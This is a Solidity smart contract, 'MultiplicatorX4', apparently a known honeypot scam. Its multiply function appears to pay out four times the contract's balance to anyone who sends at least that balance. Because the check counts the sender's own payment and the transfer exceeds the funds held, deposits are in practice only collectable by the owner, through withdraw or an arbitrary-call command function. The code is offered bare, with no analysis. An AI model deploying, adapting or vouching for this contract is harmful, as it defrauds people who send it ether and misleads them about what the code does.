pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr != address(0));

        bool success;
        bytes memory returnData;
        assembly {
            success := call(gas, adr, msg.value, add(data, 0x20), mload(data), 0, 0)
            returnData := mload(0x40)
            let returnSize := returndatasize
            returndatacopy(returnData, 0, returnSize)
        }
        require(success);
    }

    function multiply(address adr) public payable {
        require(adr != address(0));
        require(msg.value >= this.balance);

        adr.transfer(this.balance * 4);
    }
}